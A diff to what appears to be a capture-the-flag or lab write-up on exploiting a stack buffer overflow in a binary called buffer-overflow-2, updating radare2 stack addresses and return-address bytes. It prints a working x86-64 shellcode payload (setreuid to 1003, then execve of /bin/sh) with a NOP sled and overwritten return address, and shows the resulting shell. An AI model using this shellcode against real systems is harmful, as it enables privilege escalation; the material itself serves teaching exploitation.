@@ -1061,11 +1061,12 @@ hit breakpoint at: 400527
 Get the actual stack addresses of locals:
 ```
 [0x00400527]> afvd
-arg arg1 =   : rdi : 0x00000000
-var var_a8h = 0x7fffffffe2e8 = (qword)0x0000000000000000
-var var_a0h = 0x7fffffffe2f0 = (qword)0x0000000000000000
-var var_98h = 0x7fffffffe2f8 = (qword)0x0000000000000000
-var var_90h = 0x7fffffffe300 = (qword)0x0000000000000000
+arg arg1 =   : rdi : 0x7fffffffe5f5
+var var_a8h = 0x7fffffffe218 = (qword)0x0000000000000000
+var var_a0h = 0x7fffffffe220 = (qword)0x0000000000000000
+var var_98h = 0x7fffffffe228 = (qword)0x0000000000000000
+var var_90h = 0x7fffffffe230 = (qword)0x0000000000000000
+
 
 ```
 Not real clear which is which so a closer look is required.
@@ -1093,7 +1094,7 @@ RIP address from Var_90h in python can be determined with:
 ```
 buffer_addr = 0x00007fffffffe300 → 
 rip = buffer_addr.to_bytes(8, 'little')
-rip = b"\x00\xe3\xff\xff\xff\x7f\x00\x00"
+rip = b"\x68\xe2\xff\xff\xff\x7f"
 ```
 Shell will be similar previous situation so skip and use same one as before with setreuid with a slight change for 1003 instead comppnent included.
 ```
@@ -1222,7 +1223,7 @@ overflow-4]$ ./buffer-overflow-2 $(python -c "print(
 > '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' +
 > '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' +
 > '\x90'*19 +
-> '\x68\xe2\xff\xff\xff\x7f'
+>'\x68\xe2\xff\xff\xff\x7f'
 > )")
 new word is doggo\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd1\ufffdf\ufffd\ufffdjqXH\ufffd\ufffdj;XH1\ufffdI\ufffd//bin/shI\ufffdAPH\ufffd\ufffdRWH\ufffd\ufffdj<XH1\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdh\ufffd\ufffd\ufffd\ufffd
 sh-4.2$ id 
